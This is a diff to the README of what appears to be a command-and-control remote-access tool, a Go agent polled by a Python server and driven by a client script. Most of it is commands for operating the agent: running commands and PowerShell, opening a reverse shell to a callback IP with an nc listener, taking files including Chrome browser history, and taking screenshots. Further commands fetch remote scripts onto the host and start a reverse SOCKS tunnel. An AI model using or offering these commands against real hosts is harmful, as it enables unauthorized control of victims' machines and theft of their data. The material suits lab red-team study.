@@ -93,32 +93,16 @@ You first need to setup the token variable. On linue just type the same value th
 ```bash
 export AGENT_TOKEN="Azerty112345678"
 ```
-Before to be able to send command to your agent your need to know which agent connected back to your server. The following command will output all the agent connected to your server:
-```bash
-python client.py --list-agents
-```
-That will display the agent unique uid name like under the agent ID:
-```bash
-[+] Using HTTP: http://192.168.56.101:5000
-✅ 1 agent(s) connected:
-
-• Agent ID: windows11-test0_63f53f570a475ae3
-  IP: 192.168.56.10
-  Last Seen: 2025-10-29T14:44:00.522092Z
-```
-You can than run all the command you want using the unique agent id.
 The agent support the execution of remote command. You can execute the command and retrieve the result of the command.
 Use the Python client to submit commands to the server:
 ```bash
-python client.py --command "ipconfig /all" --agent-id "windows11-test0_63f53f570a475ae3"
-
+python client.py --command "ipconfig"
 ```
 
 To initiate a shell session, submit the special "shell" command:
 Replace the ip after the shell with your call back ip the port can be changed too.
 ```bash
-python client.py --command "shell 192.168.56.101:4444" --agent-id "windows11-test0_63f53f570a475ae3"
-
+python client.py --command "shell 192.168.56.101:4444"
 ```
 
 Ensure you have a listener running on the specified port before initiating the reverse shell:
@@ -127,41 +111,27 @@ nc -lvp 4444
 ```
 
 ## Collect agent command results
-Before to be able to send command to your agent your need to know which agent connected back to your server. The following command will output all the agent connected to your server:
-```bash
-python client.py --list-agents
-```
-That will display the agent unique uid name like under the agent ID:
-```bash
-[+] Using HTTP: http://192.168.56.101:5000
-✅ 1 agent(s) connected:
-
-• Agent ID: windows11-test0_63f53f570a475ae3
-  IP: 192.168.56.10
-  Last Seen: 2025-10-29T14:44:00.522092Z
-```
-You can than run all the command you want using the unique agent id.
 An id will be provided once a command has be run using the client. To retrieve the command results use the following command:
 ```bash
-python client.py --get-results --agent-id "windows11-test0_63f53f570a475ae3" 
+python client.py --get_result "1"
 ```
 
 ### Download file from the remote host
 The agent support downloading file from the remote host.
 To initiate a file to be downloaded just specify the path to the file on the remote host and the filename:
 ```bash
-python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx" --agent-id "windows11-test0_63f53f570a475ae3" 
+python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx"
 ```
 The file will be downloaded on the agent server and stored on inside a local folder named received_file.
 To download file which does contain space on the path please use the following synthax
 ```bash
-python client.py --command 'download "C:\Users\vboxuser\AppData\Local\Google\Chrome\User Data\Default\History" History' --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command 'download "C:\Users\vboxuser\AppData\Local\Google\Chrome\User Data\Default\History" History'
 ```
 ### Take a screenshot on the remote host
 The agent support taking a screenshot
 To initiate take a screenshot just type:
 ```bash
-python client.py --command "screenshot" --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command "screenshot"
 ```
 The file will be downloaded on the agent server and stored on inside a local folder named received_file.
 
@@ -169,31 +139,46 @@ The file will be downloaded on the agent server and stored on inside a local fol
 The agent support to run powershell command
 To run a powershell command type:
 ```bash
-python client.py --command "powershell (Get-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload').PSObject.Properties" --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command "powershell (Get-ItemProperty -Path 'HKCU:\Keyboard Layout\Preload').PSObject.Properties"
 ```
 
 ### Run powershell script
 The agent can run local powershell script on the remote host. The script should be already available on the remote host. You need to specify the script location on the host running the agent
 ```bash
-python client.py --command "run_script C:\Users\user\Desktop\test-script.ps1"" --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command "run_script C:\Users\user\Desktop\test-script.ps1""
 ```
 ### Fetch file from remote url
 This helper support downloading a file from a remote http server directly on the host
 ```bash
-python client.py --command "fetchfile http://192.168.56.101/script.ps1 C:\Users\user\Desktop\test.ps1" --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command "fetchfile http://192.168.56.101/script.ps1 C:\Users\user\Desktop\test.ps1"
 ```
 ### Browser History
 The agent support checking the browser history and location of the history. The following command will list the browser installed and the location of the history:
 ```bash
-python client.py --command "browser_history" --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command "browser_history"
 ```
 Than you can download the browser history running the download option.
 
 ### Public Ip
 The following command return the public ip where the agent is running calling ipinfo.
 ```bash
-python client.py --command "publicip" --agent-id "windows11-test0_63f53f570a475ae3"
+python client.py --command "publicip"
 ```
+
+### Forward TCP proxy
+You can start a reverse tcp proxy
+```bash
+python client.py --command "reverse_proxy_start"
+```
+
+To stop it just use this command
+```bash
+python client.py --command "reverse_proxy_stop"
+```
+By default the server.py will create two port 1080 to listen locally on locahost and 5555 to catch the incoming reverse tcp tunnel.
+You need to update the proxychain config: /etc/proxychains.conf to add the following line
+socks5 127.0.0.1 1080
+
 ### Agent operation
 The Go agent, once started, will periodically check the server for commands to execute. If the "shell" command is received, it will attempt to establish a shell connection to the listener address.
 
@@ -213,7 +198,30 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 
 By using this software, you acknowledge the potential impact it may have on systems and affirm that you have permission from relevant authorities or parties to use it in your context. The owner and contributors to this project assume no responsibility for unauthorized or illegal use of the tool, or for any damage caused by such use. It is the end user's responsibility to comply with all applicable local, state, national, and international laws.
 
+## Debug the application
+### Submit a Command
+This command sends a new command to the server to be queued for execution.
+```bash
+curl -X POST http://localhost:5000/submit_command -H "Content-Type: application/json" -d "{\"cmd\": \"echo Hello, World!\"}"
+```
+### Fetch a Command
+To fetch the next command from the queue (for simulation as the actual fetching is done by your Go service agent, not via curl):
+```bash
+curl http://localhost:5000/command
+```
 
+### Submit the Result of a Command
+Assuming a command with ID 1 was executed and you want to submit its result back to the server:
+```bash
+curl -X POST http://localhost:5000/submit_result -H "Content-Type: application/json" -d "{\"id\": \"1\", \"result\": \"Command executed successfully\"}"
+
+```
+
+### Retrieve the Result of a Command
+To get the result of a command execution, assuming the command had an ID of 1:
+```bash
+curl http://localhost:5000/result/1
+```
 
 ### Build the go binary with visible windows not running in background only
 Update the Dockerfile to remove the flag to hide the windows
